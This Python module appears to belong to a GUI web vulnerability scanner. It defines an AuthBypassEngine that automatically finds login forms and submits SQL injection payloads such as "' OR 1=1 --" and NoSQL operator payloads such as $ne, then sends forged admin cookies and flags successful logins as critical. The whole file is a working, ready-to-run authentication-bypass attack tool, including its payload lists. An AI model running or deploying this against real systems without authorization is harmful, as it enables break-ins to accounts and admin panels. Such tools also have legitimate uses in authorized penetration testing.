import aiohttp
import asyncio
from PySide6.QtCore import QObject, Signal

class AuthBypassEngine(QObject):
    finding_found = Signal(object)
    log_message = Signal(str)

    def __init__(self, session):
        super().__init__()
        self.session = session
        self.sql_payloads = [
            "' OR 1=1 --",
            "' OR '1'='1",
            '" OR "1"="1',
            "admin' --",
            "admin' #",
            "' OR TRUE --",
            "' OR 1=1 LIMIT 1 --"
        ]
        self.nosql_payloads = [
            {"$ne": ""},
            {"$gt": ""},
            {"$ne": 1}
        ]

    async def run(self, url, forms):
        """Attempts to bypass authentication on discovered login forms."""
        if not forms: return

        self.log_message.emit(f"<span style='color:#00f3ff'>[*] Initiating Auth Bypass Attacks on {len(forms)} forms...</span>")
        
        for form in forms:
            action = form.get('action') or url
            if not action.startswith('http'):
                 # Reconstruct absolute URL
                 from urllib.parse import urljoin
                 action = urljoin(url, action)
                 
            method = form.get('method', 'get').lower()
            inputs = form.find_all('input')
            
            # Identify user/pass fields
            user_field = None
            pass_field = None
            
            for inp in inputs:
                name = inp.get('name', '').lower()
                if not name: continue
                if 'user' in name or 'login' in name or 'email' in name:
                    user_field = inp.get('name')
                if 'pass' in name or 'pwd' in name:
                    pass_field = inp.get('name')
            
            # If we identified fields, try bypass
            if user_field and pass_field and method == 'post':
                await self._attempt_sqli(action, user_field, pass_field)
                await self._attempt_nosql(action, user_field, pass_field)

        # Also check for Privilege Escalation via Headers on the URL itself
        await self._check_privilege_escalation(url)

    async def _attempt_sqli(self, url, user_field, pass_field):
        """Tries SQL Injection payloads on the login form."""
        for payload in self.sql_payloads:
            data = {
                user_field: payload,
                pass_field: "password123" # Dummy password
            }
            try:
                # We need to detect SUCCESS. 
                # Usually success means a 302 redirect OR a 200 with different content than failure.
                # Simplest check: 302 or "Welcome/Dashboard" in text.
                async with self.session.post(url, data=data, timeout=5, allow_redirects=False) as r:
                    if r.status in [302, 301]:
                        loc = r.headers.get("Location", "")
                        if "dashboard" in loc or "admin" in loc or "home" in loc:
                             self._report_success(url, "SQLi Auth Bypass", payload)
                             return # Stop after success
                    
                    elif r.status == 200:
                        content = await r.text()
                        if "dashboard" in content.lower() or "welcome admin" in content.lower():
                             self._report_success(url, "SQLi Auth Bypass", payload)
                             return
            except:
                pass

    async def _attempt_nosql(self, url, user_field, pass_field):
        """Tries NoSQL Injection (JSON) on the login form."""
        headers = {'Content-Type': 'application/json'}
        for payload in self.nosql_payloads:
            # Try injection in username
            data = {
                user_field: payload,
                pass_field: "password123"
            }
            try:
                async with self.session.post(url, json=data, headers=headers, timeout=5, allow_redirects=False) as r:
                    if r.status in [302, 301, 200]:
                         # Heuristic check similar to SQLi
                         text = await r.text()
                         # Detection logic for NoSQL is trickier, often seeing 'admin' is good enough
                         if "admin" in text.lower() and len(text) > 500: # Simple heuristic
                             self._report_success(url, "NoSQLi Auth Bypass", str(payload))
            except:
                pass

    async def _check_privilege_escalation(self, url):
        """Checks if manipulating headers/cookies grants admin access."""
        # Simple checks
        cookies = [
            {"admin": "true"},
            {"role": "admin"},
            {"user": "admin"},
            {"authenticated": "1"}
        ]
        
        for cookie in cookies:
            try:
                async with self.session.get(url, cookies=cookie, timeout=5, allow_redirects=False) as r:
                    content = await r.text()
                    # If we see "Admin Panel" and we are 200 OK (and usually it's 403 or Login), it's a hit.
                    if "Admin" in content and "Login" not in content and r.status == 200:
                        self._report_success(url, "Privilege Escalation (Cookie)", str(cookie))
            except:
                pass

    def _report_success(self, url, method, payload):
        from core.models import Vulnerability
        
        vuln = Vulnerability(
            target=url,
            vuln_type="Authentication Bypass",
            severity="CRITICAL",
            impact=f"Bypassed login using {method}. Payload: {payload}"
        )
        self.finding_found.emit(vuln)
        self.log_message.emit(f"<span style='color:#ff0000; font-weight:bold'>[!] CRITICAL: AUTH BYPASS SUCCESS! {url} | Payload: {payload}</span>")
